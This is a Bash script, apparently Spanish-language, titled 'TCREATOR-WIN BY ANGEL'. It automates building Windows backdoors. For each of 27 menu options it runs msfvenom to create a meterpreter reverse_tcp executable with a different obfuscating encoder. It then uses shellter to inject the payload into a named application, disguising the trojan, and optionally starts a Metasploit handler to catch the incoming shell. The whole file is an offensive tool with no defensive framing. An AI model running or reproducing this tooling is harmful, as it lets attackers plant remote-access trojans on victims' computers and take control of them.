#!/bin/bash
azul='\e[0;34m'
blanco='\e[0m'
apt install shellter
apt install wine
echo -e "
${azul}████████╗ ██████╗██████╗ ███████╗ █████╗ ████████╗ ██████╗ ██████╗       ██╗    ██╗██╗███╗   ██╗
${azul}╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗      ██║    ██║██║████╗  ██║
${azul}   ██║   ██║     ██████╔╝█████╗  ███████║   ██║   ██║   ██║██████╔╝█████╗██║ █╗ ██║██║██╔██╗ ██║
${blanco}   ██║   ██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██║   ██║██╔══██╗╚════╝██║███╗██║██║██║╚██╗██║
${blanco}   ██║   ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║      ╚███╔███╔╝██║██║ ╚████║
${blanco}   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝       ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
${azul}                                                                                         BY ANGEL                  
"
echo -e "Ruta :"
echo
pwd
echo
echo -e "Copia Y Pega La Ruta :"
read ruta
echo -e "IP Address:"
read lhost
echo -e "Port:"
read lport
echo ""
echo -e "
1.windows aplication v.1         10.windows aplication v.10          19.windows aplication v.19
2.windows aplication v.2         11.windows aplication v.11          20.windows aplication v.20
3.windows aplication v.3         12.windows aplication v.12          21.windows aplication v.21
4.windows aplication v.4         13.windows aplication v.13          22.windows aplication v.22
5.windows aplication v.5         14.windows aplication v.14          23.windows aplication v.23
6.windows aplication v.6         15.windows aplication v.15          24.windows aplication v.24
7.windows aplication v.7         16.windows aplication v.16          25.windows aplication v.25
8.windows aplication v.8         17.windows aplication v.17          26.windows aplication v.26
9.windows aplication v.9         18.windows aplication v.18          27.windows aplication v.27
        "
echo
echo -e "Numero: "
read numero

echo "Nombre De La Aplicacion: "
read aplicacion

if [ $numero == 1 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 2 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/xor_dynamic -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 3 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/unicode_upper -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 4 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/unicode_mixed  -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 5 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/single_static_bit  -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 6 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/service  -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 7 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/opt_sub -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 8 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/nonupper -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 9 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/nonalpha -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 10 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/jmp_call_additive -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 11 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/fnstenv_mov -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 12 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/countdown -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 13 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_time -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 14 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_stat -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 15 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_cpuid -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 16 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/call4_dword_xor -f exe > $aplicacion.exe
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport 
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 17 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/bmp_polyglot -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 18 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/bloxor -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac


elif [ $numero == 19 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/avoid_utf8_tolower -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac


elif [ $numero == 20 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/avoid_underscore_tolower -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac


elif [ $numero == 21 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/alpha_upper -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 22 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/alpha_mixed -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 23 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/add_sub -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac


elif [ $numero == 24 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/zutto_dekiru -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac


elif [ $numero == 25 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor_dynamic -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 26 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor_context -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac

elif [ $numero == 27 ] 
then
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor -f exe > $aplicacion.exe 
	shellter -a -f $ruta/$aplicacion.exe -p meterpreter_reverse_tcp --lhost $lhost --port $lport
echo -e "Esperar Conexiones? (S or N)"
read lisn
	case $lisn in 
	[sS]) echo -e "Abriendo exploit/multi/handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "exit"	
	   exit 0
	   ;;
	   *) echo -e "exit"
       exit 0 
	   ;;
esac


fi
